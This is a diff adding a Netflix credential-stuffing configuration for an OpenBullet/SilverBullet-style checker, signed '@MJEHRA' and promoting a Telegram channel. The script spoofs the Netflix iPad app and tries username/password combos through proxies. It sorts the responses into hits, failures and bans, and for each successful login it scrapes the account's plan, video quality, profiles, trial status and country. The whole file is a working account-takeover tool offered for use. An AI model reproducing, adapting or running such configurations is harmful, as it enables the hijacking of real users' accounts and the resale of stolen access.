@@ -1,0 +1,160 @@
+[SETTINGS]
+{
+  "Name": "NETFLIX CONFIG BY @MJEHRA",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2024-08-21T03:18:54.6508176-07:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@MJEHRA",
+  "Version": "1.1.4 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Join : @GODT00L",
+      "VariableName": "",
+      "Id": 803463406
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "NETFLIX SEL CYBER",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+FUNCTION URLEncode "{\"mode\":\"login\",\"verb\":\"POST\",\"action\":\"loginAction\",\"fields\":{\"password\":\"<PASS>\",\"rememberMe\":\"true\",\"email\":\"<USER>\"},\"flow\":\"appleSignUp\"}" -> VAR "post" 
+
+FUNCTION RandomString "?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m" -> VAR "id" 
+
+#get_cookies REQUEST GET "https://ios.prod.http1.netflix.com/iosui/user/11.3?appInternalVersion=11.3.0&appVersion=11.3.0&device_type=NFAPPL-01-&esn=NFAPPL-01-IPAD3%3D4-<id>&idiom=pad&iosVersion=10.3.3&isTablet=true&kids=false&maxDeviceWidth=1024&model=ciccone&modelType=IPAD3-4&odpAware=true&path=%5B%22messaging%22%2C%22alerts%22%5D&path=%5B%22messaging%22%2C%22surveys%22%5D&path=%5B%22customerSupportVoipAuthorizations%22%5D&path=%5B%22geolocation%22%5D&path=%5B%22languages%22%5D&path=%5B%22config%22%5D&path=%5B%22nrmstart%22%5D&pathFormat=graph&pixelDensity=2.0&progressive=false&responseFormat=json" 
+  
+  HEADER "Host: ios.prod.http1.netflix.com" 
+  HEADER "Accept-Language: es-ES;q=1" 
+  HEADER "User-Agent: Argo/11.3.0 (iPad; iOS 10.3.3; Scale/2.00)" 
+  HEADER "X-Netflix.client.idiom: pad" 
+  HEADER "X-Netflix.client.iosVersion: 10.3.3" 
+  HEADER "X-Netflix.Argo.NFNSM: 9" 
+  HEADER "Accept: */*" 
+  HEADER "X-Netflix.client.appVersion: 11.3.0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-Netflix.client.type: argo" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#flwssn PARSE "<COOKIES(flwssn)>" LR "" "" -> VAR "ck1" 
+
+#nfvdid PARSE "<COOKIES(nfvdid)>" LR "" "" -> VAR "ck2" 
+
+#memclid PARSE "<COOKIES(memclid)>" LR "" "" -> VAR "ck3" 
+
+#login REQUEST POST "https://ios.prod.http1.netflix.com/iosui/user/11.3" 
+  CONTENT "appInternalVersion=11.3.0&appVersion=11.3.0&callPath=%5B%22moneyball%22%2C%22appleSignUp%22%2C%22next%22%5D&config=%7B%22kidsMyListEnabled%22%3A%22true%22%2C%22interactiveFeatureMinecraftEnabled%22%3A%22false%22%2C%22aroGalleriesEnabled%22%3A%22false%22%2C%22interactiveFeatureStretchBreakoutEnabled%22%3A%22true%22%2C%22billboardKidsTrailerEnabled%22%3A%22false%22%2C%22interactiveFeatureAppUpdateDialogueEnabled%22%3A%22false%22%2C%22interactiveFeaturePIBEnabled%22%3A%22true%22%2C%22kidsBillboardEnabled%22%3A%22true%22%2C%22titleCapabilityFlattenedShowEnabled%22%3A%22true%22%2C%22volatileBillboardEnabled%22%3A%22false%22%2C%22roarEnabled%22%3A%22true%22%2C%22billboardTrailerEnabled%22%3A%22false%22%2C%22showMoreDirectors%22%3Atrue%2C%22billboardEnabled%22%3A%22true%22%2C%22interactiveFeatureBuddyEnabled%22%3A%22true%22%2C%22bigRowEnabled%22%3A%22true%22%2C%22kidsUIOnPhone%22%3Afalse%2C%22contentWarningEnabled%22%3A%22true%22%2C%22interactiveFeatureBadgeIconTestEnabled%22%3A%229.57.0%22%2C%22verticalBillboardEnabled%22%3A%22true%22%2C%22useSecureImages%22%3Atrue%2C%22billboardPredictionEnabled%22%3A%22false%22%2C%22previewsRowEnabled%22%3A%22false%22%2C%22shortformRowEnabled%22%3A%22false%22%2C%22warmerHasGenres%22%3Atrue%2C%22kidsTrailers%22%3Atrue%7D&device_type=NFAPPL-01-&esn=NFAPPL-01-IPAD3%3D4-<id>&idiom=pad&iosVersion=10.3.3&isTablet=true&kids=false&languages=es-ES&locale=es-ES&maxDeviceWidth=1024&method=call&model=hall&modelType=IPAD3-4&odpAware=true&param=<post>&pathFormat=graph&pixelDensity=2.0&progressive=false&responseFormat=json" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "memclid: <ck3>" 
+  COOKIE "flwssn: <ck1>" 
+  COOKIE "nfvdid: <ck2>" 
+  HEADER "Host: ios.prod.http1.netflix.com" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Argo/11.3.0 (iPad; iOS 10.3.3; Scale/2.00)" 
+  HEADER "X-Netflix.client.idiom: pad" 
+  HEADER "X-Netflix.client.iosVersion: 10.3.3" 
+  HEADER "X-Netflix.Argo.NFNSM: 9" 
+  HEADER "Accept-Language: es-ES;q=1" 
+  HEADER "X-Netflix.client.appVersion: 11.3.0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-Netflix.client.type: argo" 
+  HEADER "X-Netflix.Argo.abTests: " 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "403" 
+    KEY "throttling_failure" 
+    KEY "unrecognized_email_consumption_only" 
+    KEY "never_member_consumption_only" 
+    KEY "<RESPONSECODE>" Contains "503" 
+    KEY "<RESPONSECODE>" Contains "400" 
+  KEYCHAIN Failure OR 
+    KEY "\"incorrect_password\"" 
+    KEY "password_is_empty" 
+  KEYCHAIN Success OR 
+    KEY "memberHome" 
+
+REQUEST GET "https://www.netflix.com/YourAccount" 
+  
+  COOKIE "flwssn: <ck1>" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: www.netflix.com" 
+  HEADER "Referer: https://www.netflix.com/browse" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+PARSE "<SOURCE>" LR "\"plan-label\"><b>" "</b>" CreateEmpty=FALSE -> CAP "Plan" 
+
+PARSE "<SOURCE>" LR "videoQuality\":{\"fieldType\":\"String\",\"value\":\"" "\"" CreateEmpty=FALSE -> CAP "videoQuality" 
+
+#Profiles PARSE "<SOURCE>" LR "\",\"numProfiles\":" ",\"" CreateEmpty=FALSE -> CAP "Profiles" 
+
+#IsFreeTrial PARSE "<SOURCE>" LR "isInFreeTrial\":" "," CreateEmpty=FALSE -> CAP "IsFreeTrial" 
+
+#isDVD PARSE "<SOURCE>" LR "isDVD\":" "," CreateEmpty=FALSE -> CAP "isDVD" 
+
+#Country PARSE "<SOURCE>" LR "\",\"currentCountry\":\"" "\"" CreateEmpty=FALSE -> CAP "Country" 
+
+FUNCTION Constant "@MJEHRA" -> CAP "PROGRAMMER " 
+
+FUNCTION Constant "@GODT00L" -> CAP "JOIN : " 
+
